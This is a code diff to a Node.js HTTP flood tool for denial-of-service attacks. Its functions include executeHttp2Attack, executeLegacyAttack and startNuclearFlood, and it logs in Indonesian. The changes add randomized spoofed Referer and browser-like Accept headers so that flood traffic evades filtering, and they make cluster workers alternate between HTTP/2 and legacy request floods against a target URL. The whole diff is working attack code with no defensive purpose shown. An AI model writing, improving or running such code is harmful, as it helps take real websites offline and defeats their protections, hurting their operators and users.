@@ -13,6 +13,14 @@ const userAgents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
 ];
 
+const referers = [
+    "https://www.google.com/",
+    "https://www.youtube.com/",
+    "https://www.facebook.com/",
+    "https://www.bing.com/",
+    "https://www.yahoo.com/",
+];
+
 function generateComplexJsonPayload() {
     const data = {
         id: crypto.randomUUID(),
@@ -62,6 +70,10 @@ function executeHttp2Attack(targetUrl, durationSeconds) { // This function runs 
             'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
             'Cache-Control': 'no-cache',
             'Pragma': 'no-cache',
+            'Referer': referers[Math.floor(Math.random() * referers.length)],
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
         };
 
         const stream = client.request(headers);
@@ -147,6 +159,10 @@ function executeLegacyAttack(targetUrl, durationSeconds) {
             'Pragma': 'no-cache',
             'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
             'Connection': 'keep-alive',
+            'Referer': referers[Math.floor(Math.random() * referers.length)],
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
         };
 
         const req = protocol.request({
@@ -182,13 +198,13 @@ function executeLegacyAttack(targetUrl, durationSeconds) {
     }, durationSeconds * 1000);
 }
 
-function startNuclearFlood(targetUrl, durationSeconds, attackType, statusCallback) { // This function runs in the master process
+function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This function runs in the master process
     if (cluster.isPrimary) { // Master process logic
         console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
         
         cluster.settings = {
             exec: __filename,
-            args: [targetUrl, String(durationSeconds), attackType],
+            args: [targetUrl, String(durationSeconds)],
             execArgv: ['--max-old-space-size=1024']
         };
 
@@ -217,7 +233,8 @@ function startNuclearFlood(targetUrl, durationSeconds, attackType, statusCallbac
         const numCPUs = Math.min(os.cpus().length, 2);
         
         for (let i = 0; i < numCPUs; i++) {
-            const worker = cluster.fork();
+            const attackType = (i % 2 === 0) ? 'http2' : 'legacy';
+            const worker = cluster.fork({ ATTACK_TYPE: attackType });
             worker.on('message', (message) => {
                 if (message.type === 'stats') {
                     totalSent += message.sent || 0;
@@ -245,8 +262,9 @@ function startNuclearFlood(targetUrl, durationSeconds, attackType, statusCallbac
 }
 
 if (cluster.isWorker) { // Worker process logic
-    const [targetUrl, durationSeconds, attackType] = process.argv.slice(2);
-    if (attackType === 'legacy') {
+    const [targetUrl, durationSeconds] = process.argv.slice(2);
+    const workerAttackType = process.env.ATTACK_TYPE;
+    if (workerAttackType === 'legacy') {
         executeLegacyAttack(targetUrl, parseInt(durationSeconds, 10));
     } else {
         executeHttp2Attack(targetUrl, parseInt(durationSeconds, 10));
